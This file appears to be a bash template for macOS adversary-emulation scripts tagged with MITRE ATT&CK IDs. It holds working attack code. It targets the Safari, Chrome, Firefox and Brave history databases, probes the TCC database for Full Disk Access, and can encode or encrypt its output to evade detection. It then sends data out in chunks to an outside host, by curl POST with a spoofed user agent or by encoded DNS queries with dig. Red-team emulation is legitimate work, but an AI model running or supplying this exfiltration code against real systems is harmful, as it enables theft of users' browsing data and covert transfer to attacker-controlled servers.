# Script Name: [TECHNIQUE_NAME]
# MITRE ATT&CK Technique: [TECHNIQUE_ID]
# Author: [YOUR_NAME]
# Date: $(date +%Y-%m-%d)
# Version: 1.0

# Description:
# [Brief description of what the script does and its purpose]

# References:
# - [URL to MITRE ATT&CK technique]
# - [Any other relevant references]

# MITRE ATT&CK Reference  var map
TACTIC="[Your Tactic]"
TTP_ID="[Your TTP ID]"

TACTIC_EXFIL="Exfiltration"
TTP_ID_EXFIL="T1041"

TACTIC_ENCRYPT="Defense Evasion"
TTP_ID_ENCRYPT="T1027"

TACTIC_ENCODE="Defense Evasion"
TTP_ID_ENCODE="T1140"

TTP_ID_ENCODE_BASE64="T1027.001"
TTP_ID_ENCODE_STEGANOGRAPHY="T1027.003"
TTP_ID_ENCODE_PERL="T1059.006"


# Script metadata 
NAME="[TECHNIQUE_NAME]"
TTP_ID="[TECHNIQUE_ID]"
TACTIC="[Your Tactic]"

# Logging; Used by Log utlity functions
LOG_DIR="../../logs"
LOG_FILE_NAME="${TTP_ID}_${NAME}.log"
LOG_ENABLED=false

# Static variables 
SAFARI_DB="$HOME/Library/Safari/History.db"
CHROME_DB="$HOME/Library/Application Support/Google/Chrome/Default/History"
FIREFOX_PROFILE=$(find ~/Library/Application\ Support/Firefox/Profiles/*.default-release -maxdepth 0 -type d 2>/dev/null | head -n 1)
FIREFOX_DB="${FIREFOX_PROFILE}/places.sqlite"
BRAVE_DB="$HOME/Library/Application Support/BraveSoftware/Brave-Browser/Default/History"
USER_AGENT="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"



# Utility Function switch variables
EXFIL=false
SEARCH=false


ENCRYPT_KEY=""

# Browser function switch varaibles
# Used by browser_history.sh 
SAFARI=false
CHROME=false
FIREFOX=false
BRAVE=false


# Argument Inpu Variables
INPUT_ACCOUNT=""
INPUT_APP_NAME=""
INPUT_ARCHIVE_NAME=""
INPUT_BUNDLE_ID=""
INPUT_CERTIFICATE_NAME=""
INPUT_CHUNK_SIZE=1000  # Default chunk size
INPUT_COMMAND=""
INPUT_COMPRESSION=""
INPUT_DATE_END=""
INPUT_DATE_START=""
INPUT_DAYS=7  # Default to 7 days if not specified
INPUT_DEBUG=false
INPUT_DEVICE=""
INPUT_DIR=""
INPUT_DST_IP=""
INPUT_ENCODE="none"
INPUT_ENCRYPT="none"
INPUT_END_TIME=""
INPUT_EXFIL_METHOD=""
INPUT_EXFIL_URI=""
INPUT_FILE=""
INPUT_FORMAT=""
INPUT_GROUP=""
INPUT_HASH_VALUE=""
INPUT_HOSTNAME=""
INPUT_INTERFACE=""
INPUT_INTERVAL=""
INPUT_IPADDR=""
INPUT_KEY=""
INPUT_KEYCHAIN_PATH=""
INPUT_LANGUAGE=""
INPUT_LOCALE=""
INPUT_LOG_LEVEL=""
INPUT_NETWORK_NAME=""
INPUT_OUTPUT_FILE=""
INPUT_PACKAGE_NAME=""
INPUT_PID=""
INPUT_PLIST_PATH=""
INPUT_PORT=""
INPUT_PROCESS_NAME=""
INPUT_PROTOCOL=""
INPUT_REGEX_PATTERN=""
INPUT_RETRY_COUNT=""
INPUT_SCRIPT_PATH=""
INPUT_SERVER=""
INPUT_SERVICE=""
INPUT_SRC_IP=""
INPUT_SSID=""
INPUT_START_TIME=""
INPUT_THRESHOLD=""
INPUT_TIMEOUT=""
INPUT_TIMESTAMP=""
INPUT_TIMEZONE=""
INPUT_URL=""
INPUT_USER=""
INPUT_VALUE=""
INPUT_VERSION=""
INPUT_VOLUME=""

# Use simple variables for storing commands
CMD_1='[Command for cmd1]'
CMD_2='[Command for cmd2]'
CMD_3='[Command for cmd3]'
# Add more commands as needed

# Utility functions
#FunctionType: utility
display_help() {
    cat << EOF
Usage: $(basename "$0") [OPTIONS]

Description:
  [Brief description of the script's functionality]

Options:
  General:
    -h, --help              Show this help message and exit
    -v, --verbose           Enable detailed output
    -l, --log               Log output to file (rotates at 5MB)
    -d, --debug             Enable debug output

  Specific Commands:
    --cmd1                  Execute command 1
    --cmd2                  Execute command 2
    --cmd3                  Execute command 3

  Output Processing:
    -j, --json              Output results in JSON format
    -e, --encode TYPE       Encode output (b64|hex|perl_b64|perl_utf8)
    -E, --encrypt METHOD    Encrypt output (aes|blowfish|gpg). Generates random key

  Data Exfiltration:
    --exfil URI             Exfil via HTTP POST using curl (RFC 7231)
    --exfil-dns DOMAIN      Exfil via DNS TXT queries using dig (RFC 1035)
    -c, --chunksize SIZE    Set the chunk size for HTTP exfiltration (100-10000 bytes, default 1000)

EOF
}

#FunctionType: utility
get_timestamp() {
    date +"%Y-%m-%d %H:%M:%S"
}

#FunctionType: utility
log() {
    local message="$1"
    local timestamp=$(date +"%Y-%m-%d %H:%M:%S")
    echo "[${timestamp}] $message" >> "$LOG_FILE"
    
    if [ "$DEBUG" = true ]; then
        echo "[${timestamp}] $message" >&2
    fi
}

#FunctionType: utility
create_log_file() {
    local script_name=$(basename "$0" .sh)
    mkdir -p "$LOG_DIR"
    touch "${LOG_DIR}/${LOG_FILE_NAME}"
}

#FunctionType: utility
log_output() {
    local output="$1"
    local max_size=$((5 * 1024 * 1024))  # 5MB in bytes
    local full_log_path="${LOG_DIR}/${LOG_FILE_NAME}"
    
    if [ ! -f "$full_log_path" ] || [ $(stat -f%z "$full_log_path") -ge $max_size ]; then
        create_log_file
    fi
    
    echo "$output" >> "$full_log_path"
    
    # Rotate log if it exceeds 5MB
    if [ $(stat -f%z "$full_log_path") -ge $max_size ]; then
        mv "$full_log_path" "${full_log_path}.old"
        create_log_file
    fi
}

#FunctionType: utility
chunk_data() {
    local data="$1"
    local chunk_size="$2"
    local output=""
    
    while [ -n "$data" ]; do
        output+="${data:0:$chunk_size}"$'\n'
        data="${data:$chunk_size}"
    done
    
    echo "$output"
}

#FunctionType: utility
encode_output() {
    local data="$1"
    local original_ttp_id=$TTP_ID
    local original_tactic=$TACTIC

    case $ENCODE in
        b64)
            TTP_ID=$TTP_ID_ENCODE_BASE64
            TACTIC=$TACTIC_ENCODE
            log_to_stdout "Encoded output using Base64" "encode_output" "base64"
            echo "$data" | base64
            ;;
        hex)
            TTP_ID=$TTP_ID_ENCODE
            TACTIC=$TACTIC_ENCODE
            log_to_stdout "Encoded output using Hex" "encode_output" "xxd -p"
            echo "$data" | xxd -p
            ;;
        perl_b64)
            TTP_ID=$TTP_ID_ENCODE_PERL
            TACTIC="Execution"
            log_to_stdout "Encoded output using Perl Base64" "encode_output" "perl -MMIME::Base64 -e 'print encode_base64(\"$data\");'"
            perl -MMIME::Base64 -e "print encode_base64(\"$data\");"
            ;;
        perl_utf8)
            TTP_ID=$TTP_ID_ENCODE_PERL
            TACTIC="Execution"
            log_to_stdout "Encoded output using Perl UTF-8" "encode_output" "perl -e 'print \"$data\".encode(\"UTF-8\");'"
            perl -e "print \"$data\".encode(\"UTF-8\");"
            ;;
        *)
            echo "Unknown encoding type: $ENCODE" >&2
            return 1
            ;;
    esac

    TTP_ID=$original_ttp_id
    TACTIC=$original_tactic
}

#FunctionType: utility
encrypt_output() {
    local data="$1"
    local method="$2"
    local key="$3"

    case "$method" in
        aes)
            echo "$data" | openssl enc -aes-256-cbc -pbkdf2 -a -A -salt -pass pass:"$key"
            ;;
        blowfish)
            echo "$data" | openssl bf-cbc -pbkdf2 -a -A -salt -pass pass:"$key"
            ;;
        gpg)
            echo "$data" | gpg --batch --yes --passphrase "$key" --symmetric --armor
            ;;
        *)
            echo "Unsupported encryption method: $method" >&2
            return 1
            ;;
    esac
}

#FunctionType: utility
# Encodes chars that violate RFC-3986 
encode_input() {
    local input="$1"
    # Perform encoding for special characters: ", <, >, \, ^, `, {
    local rfc3996=$(echo "$input" | sed 's/"/%22/g; s/</%3C/g; s/>/%3E/g; s/\\/%5C/g; s/\^/%5E/g; s/`/%60/g; s/{/%7B/g')
    # Output the encoded string
    echo "$rfc3996"
}



#FunctionType: utility
# Usage: function that calls validate_input must declare input and pattern. 

validate_input() {
    local input="$1"
    local pattern="$2"
    if [[ ! $input =~ $pattern ]]; then
        return 1
    fi
    return 0
}

#FunctionType: utility 
# Sanitizes input with garbage chars. 
# at the moment, its only used by other utlity functions 
# All input must pass through this function
# TODO: 
# to bypass this fuction, add your function to the whitelist_functions()
sanitize_input() {
    local input="$1"
    echo "$input" | sed 's/[;&|]//g'
}

#FunctionType: utility
execute_command() {
    local cmd_key="$1"
    local cmd=$(eval echo \$CMD_$cmd_key)
    
    if [ -z "$cmd" ]; then
        echo "Unknown command: $cmd_key" >&2
        return 1
    fi
    
    eval "$cmd" 2>&1 || echo "Command failed: $cmd" >&2
}

#FunctionType: attackScript
exfil_http() {
    local data="$1"
    local url="$2"
    local og_ttp="$TTP_ID"
    TTP_ID="$TTP_ID_EXFIL"

    log_to_stdout "Starting HTTP exfil" "exfil_http" "curl $url"
    
    local chunks=$(chunk_data "$data" "$CHUNK_SIZE")
    local total=$(echo "$chunks" | wc -l)
    local count=1

    echo "$chunks" | while IFS= read -r chunk; do
        local size=${#chunk}
        log_to_stdout "Sending chunk $count/$total ($size bytes)" "exfil_http" "curl $url"
        
        if curl -L -s -X POST -d "$chunk" "$url" -H "User-Agent: $USER_AGENT" --insecure -o /dev/null -w "%{http_code}" | grep -q "^2"; then
            log_to_stdout "Chunk $count/$total sent" "exfil_http" "curl $url"
        else
            log_to_stdout "Chunk $count/$total failed" "exfil_http" "curl $url"
            TTP_ID="$og_ttp"
            return 1
        fi
        count=$((count + 1))
    done

    log_to_stdout "HTTP exfil complete" "exfil_http" "curl $url"
    TTP_ID="$og_ttp"
    return 0
}

#FunctionType: attackScript
exfil_dns() {
    local data="$1"
    local domain="$2"
    local id="$3"
    local original_ttp_id=$TTP_ID
    TTP_ID=$TTP_ID_EXFIL

    local encoded_data=$(echo "$data" | base64 | tr '+/' '-_' | tr -d '=')
    local encoded_id=$(echo "$id" | base64 | tr '+/' '-_' | tr -d '=')
    local dns_chunk_size=63  # Fixed max length of a DNS label

    log_to_stdout "Attempting to exfiltrate data via DNS" "exfil_dns" "dig +short ${encoded_id}.id.$domain"

    # Send the ID first
    if ! dig +short "${encoded_id}.id.$domain" A > /dev/null; then
        log_to_stdout "Failed to send ID via DNS" "exfil_dns" "dig +short ${encoded_id}.id.$domain"
        TTP_ID=$original_ttp_id
        return 1
    fi

    local chunks=$(chunk_data "$encoded_data" "$dns_chunk_size")
    local total_chunks=$(echo "$chunks" | wc -l)
    local chunk_num=0

    echo "$chunks" | while IFS= read -r chunk; do
        if dig +short "${chunk}.${chunk_num}.$domain" A > /dev/null; then
            log_to_stdout "Successfully sent chunk $((chunk_num+1))/$total_chunks via DNS" "exfil_dns" "dig +short ${chunk}.${chunk_num}.$domain"
        else
            log_to_stdout "Failed to send chunk $((chunk_num+1))/$total_chunks via DNS" "exfil_dns" "dig +short ${chunk}.${chunk_num}.$domain"
            TTP_ID=$original_ttp_id
            return 1
        fi
        chunk_num=$((chunk_num+1))
    done

    if dig +short "end.$domain" A > /dev/null; then
        log_to_stdout "Successfully completed DNS exfiltration" "exfil_dns" "dig +short end.$domain"
        TTP_ID=$original_ttp_id
        return 0
    else
        log_to_stdout "Failed to send end signal via DNS" "exfil_dns" "dig +short end.$domain"
        TTP_ID=$original_ttp_id
        return 1
    fi
}

#FunctionType: utility
check_perms_tcc() {
    local tcc_db="/Library/Application Support/com.apple.TCC/TCC.db"
    local file_size=$(stat -f%z "$tcc_db" 2>/dev/null)
    
    if [ -z "$file_size" ] || [ "$file_size" -eq 0 ]; then
        log_to_stdout "Warning: This app does not have Full Disk Access (FDA)" "check_perms_tcc" ""
        return 1
    else
        log_to_stdout "Info: This app has Full Disk Access (FDA)" "check_perms_tcc" ""
        log_to_stdout "TCC.db file size: $file_size bytes" "check_perms_tcc" ""
        return 0
    fi
}

# Debug function
debug() {
    if [ "$DEBUG" = true ]; then
        local timestamp=$(date +"%Y-%m-%d %H:%M:%S")
        local calling_function="${FUNCNAME[1]:-main}"
        local line_number="${BASH_LINENO[0]}"
        local pid=$$
        local ppid=$PPID
        
        printf "[DEBUG] %s | Function: %s | Line: %s | PID: %s | PPID: %s | " \
               "$timestamp" "$calling_function" "$line_number" "$pid" "$ppid" >&2
        
        printf "%s\n" "$*" >&2
        
        # If we're in a subprocess, print its details
        if [ "$PPID" != "$$" ]; then
            ps -o pid,ppid,command -p $$ >&2
        fi
    fi
}

# Parse command-line arguments
while [ "$#" -gt 0 ]; do
    case "$1" in
        --help) display_help; exit 0 ;;
        --verbose) VERBOSE=true ;;
        --log) LOG_ENABLED=true ;;
        --cmd1|--cmd2|--cmd3)
            cmd_number="${1#--cmd}"
            eval "execute_command \$CMD_$cmd_number"
            ;;
        --encode=*)
            ENCODE="${1#*=}"
            if ! validate_input "$ENCODE" "^(b64|hex|perl_b64|perl_utf8)$"; then
                echo "Invalid encoding type: $ENCODE" >&2
                exit 1
            fi
            ;;
        --encrypt=*)
            ENCRYPT="${1#*=}"
            if [[ "$ENCRYPT" =~ ^(aes|blowfish|gpg)$ ]]; then
                ENCRYPT_KEY=$(openssl rand -base64 32)
                verbose "Generated encryption key: $ENCRYPT_KEY"
            else
                echo "Invalid encryption method. Use aes, blowfish, or gpg" >&2
                exit 1
            fi
            ;;
        --exfil=*)
            EXFIL=true
            EXFIL_METHOD="${1#*=}"
            EXFIL_URI="${1#*=dns=}"
            if ! validate_input "$EXFIL_METHOD" "^(http://|https://|dns=)[a-zA-Z0-9.-]+"; then
                echo "Invalid exfiltration method: $EXFIL_METHOD" >&2
                exit 1
            fi
            ;;
        --chunksize=*)
            CHUNK_SIZE="${1#*=}"
            if ! validate_input "$CHUNK_SIZE" "^[0-9]+$"; then
                echo "Invalid chunk size: $CHUNK_SIZE" >&2
                exit 1
            fi
            ;;
        --json) FORMAT="json" ;;
        --debug) DEBUG=true ;;
        *) echo "Unknown option: $1" >&2; display_help; exit 1 ;;
    esac
    shift
done

main() {
    debug "Starting main function"
    
    local output=""
    
    # Function to convert data to JSON
    output_json() {
        local input="$1"
        echo "$input" | jq -c '.'
    }
    
    if [ -n "$output" ]; then
        debug "Processing output"
        if [ "$FORMAT" = "json" ]; then
            debug "Converting output to JSON"
            output=$(output_json "$output")
        else
            # If FORMAT is not json, we format the output for readability
            # This part may vary depending on the specific script
            output=$(echo "$output" | jq -r '.domain as $domain | .visits[] | "\($domain)\t\(.visit_date)\t\(.url)"')
        fi

        if [ "$ENCODE" != "none" ]; then
            debug "Encoding output using $ENCODE method"
            output=$(encode_output "$output")
        fi

        if [ "$ENCRYPT" != "none" ]; then
            debug "Encrypting output using $ENCRYPT method"
            output=$(encrypt_output "$output")
        fi

        if [ "$LOG_ENABLED" = true ]; then
            log_output "$output"
            debug "Output logged to $LOG_FILE"
        elif [ "$EXFIL" = true ]; then
            if [ "$EXFIL_METHOD" = "http" ]; then
                exfil_http "$output" "$EXFIL_URI"
            elif [ "$EXFIL_METHOD" = "dns" ]; then
                exfil_dns "$output" "$EXFIL_URI"
            fi
        else
            echo "$output"
        fi
    else
        if [ "$FORMAT" = "json" ]; then
            echo '{"error": "No information found"}'
        else
            echo "No information found"
        fi
    fi

    debug "Main function completed"
}

main

